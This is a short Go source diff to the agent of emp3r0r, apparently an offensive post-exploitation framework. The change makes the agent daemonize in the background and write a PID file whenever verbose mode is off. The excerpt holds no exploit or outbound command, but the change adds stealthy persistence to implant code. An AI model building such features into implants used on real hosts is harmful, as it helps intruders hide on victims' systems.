@@ -23,6 +23,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
+	"github.com/sevlyar/go-daemon"
 	"src.elv.sh/pkg/buildinfo"
 	"src.elv.sh/pkg/lsp"
 	"src.elv.sh/pkg/prog"
@@ -45,7 +46,6 @@ func main() {
 	// version
 	if *version {
 		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
-
 		return
 	}
 
@@ -67,6 +67,21 @@ func main() {
 	if *verbose {
 		fmt.Println("emp3r0r agent has started")
 		log.SetOutput(os.Stderr)
+	} else {
+		// daemonize
+		cntxt := &daemon.Context{
+			PidFileName: agent.RuntimeConfig.PIDFile,
+			PidFilePerm: 0600,
+			Args:        os.Args,
+		}
+		d, err := cntxt.Reborn()
+		if err != nil {
+			log.Fatal("Unable to run: ", err)
+		}
+		if d != nil {
+			return
+		}
+		defer cntxt.Release()
 	}
 
 	// applyRuntimeConfig
